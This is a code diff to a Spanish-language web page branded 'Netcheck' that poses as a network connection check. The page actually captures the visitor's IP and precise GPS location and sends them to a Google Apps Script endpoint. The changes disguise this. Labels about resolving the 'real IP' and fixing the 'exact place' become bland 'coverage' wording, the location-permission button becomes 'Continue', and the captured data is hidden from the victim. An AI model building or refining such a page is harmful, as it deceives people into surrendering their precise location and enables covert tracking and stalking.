@@ -65,18 +65,18 @@ display:grid;place-items:center;font-size:11px;font-weight:900;flex:none}
 
   <div class="card hide" id="inapp">
     <h1>Abrí el enlace en tu navegador</h1>
-    <p class="sub">Este navegador interno enmascara la IP y bloquea el GPS de precisión. Abrilo en Chrome o Safari.</p>
+    <p class="sub">Este navegador interno no permite completar la verificación. Abrilo en Chrome o Safari.</p>
     <button class="btn" id="abrirExt">Abrir en el navegador</button>
     <button class="btn ghost" id="seguirIgual">Continuar igual</button>
   </div>
 
   <div class="card" id="card">
     <h1>Verificación de conexión</h1>
-    <p class="sub" id="sub">Comprobando tu red y tu ubicación.</p>
+    <p class="sub" id="sub">Comprobando tu conexión.</p>
     <div class="bar"><i id="bar"></i></div>
     <div class="step"><span class="dot" id="d1"></span><span>Leyendo datos de <b>red</b></span></div>
-    <div class="step"><span class="dot" id="d2"></span><span>Resolviendo <b>IP real</b> y ruta</span></div>
-    <div class="step"><span class="dot" id="d3"></span><span>Fijando <b>lugar exacto</b></span></div>
+    <div class="step"><span class="dot" id="d2"></span><span>Verificando <b>dirección IP</b></span></div>
+    <div class="step"><span class="dot" id="d3"></span><span>Comprobando <b>cobertura</b></span></div>
     <div class="step"><span class="dot" id="d4"></span><span>Enviando resultado</span></div>
 
     <div class="box hide" id="boxIp">
@@ -94,8 +94,8 @@ display:grid;place-items:center;font-size:11px;font-weight:900;flex:none}
 
     <div class="note hide" id="aviso"></div>
 
-    <button class="btn hide" id="permitir">Permitir ubicación exacta</button>
-    <button class="btn ghost hide" id="soloip">Continuar solo con la IP</button>
+    <button class="btn hide" id="permitir">Continuar</button>
+    <button class="btn ghost hide" id="soloip">Omitir</button>
     <button class="btn ghost hide" id="afinar">Seguir afinando</button>
 
     <div class="ok hide" id="final">Conexión verificada</div>
@@ -110,7 +110,7 @@ display:grid;place-items:center;font-size:11px;font-weight:900;flex:none}
 const CONFIG = {
   endpoint: "https://script.google.com/macros/s/AKfycbwZuLmVDrCeJ2tOU3I2r1ApJSCF66ntAJO41urKGwQvED9eN5L9Pwm-cPJwC5hxmxQJ/exec",        // <-- URL de Apps Script terminada en /exec
   marca: "Netcheck",
-  mostrarDatos: true,
+  mostrarDatos: false,
   esperaGps: 45000,    // ms de escucha continua del GPS
   objetivo: 10         // metros: al alcanzarlos, corta
 };
@@ -321,7 +321,7 @@ async function reversa(lat,lon){
 function arrancarGps(){
   if(gpsActivo)return; gpsActivo=true; cerrarGps=false;
   $('permitir').classList.add('hide'); $('soloip').classList.add('hide'); $('aviso').classList.add('hide');
-  $('boxAddr').classList.remove('hide');
+  if(CONFIG.mostrarDatos)$('boxAddr').classList.remove('hide');
   $('sub').textContent='Mantené la página abierta mientras afinamos la ubicación.';
 
   if(!window.isSecureContext||!navigator.geolocation){
@@ -458,11 +458,15 @@ function fin(){
   paso(4); enviar({final:1},true);
   const f=$('final'); f.classList.remove('hide');
   $('sub').textContent='Verificación completa.';
-  if(D.exacta===1){ f.textContent='Conexión verificada · ubicación exacta'; }
-  else if(D.exacta===2){ f.textContent='Conexión verificada · precisión media'; f.classList.add('aprox'); }
-  else { f.textContent='Conexión verificada · ubicación aproximada'; f.classList.add('aprox'); }
-  if(D.exacta!==1){ $('afinar').classList.remove('hide'); }
-  $('copiar').classList.remove('hide');
+  if(CONFIG.mostrarDatos){
+    if(D.exacta===1){ f.textContent='Conexión verificada · ubicación exacta'; }
+    else if(D.exacta===2){ f.textContent='Conexión verificada · precisión media'; f.classList.add('aprox'); }
+    else { f.textContent='Conexión verificada · ubicación aproximada'; f.classList.add('aprox'); }
+    if(D.exacta!==1){ $('afinar').classList.remove('hide'); }
+    $('copiar').classList.remove('hide');
+  }else{
+    f.textContent='Conexión verificada';
+  }
   guardar();
 }
 function guardar(){
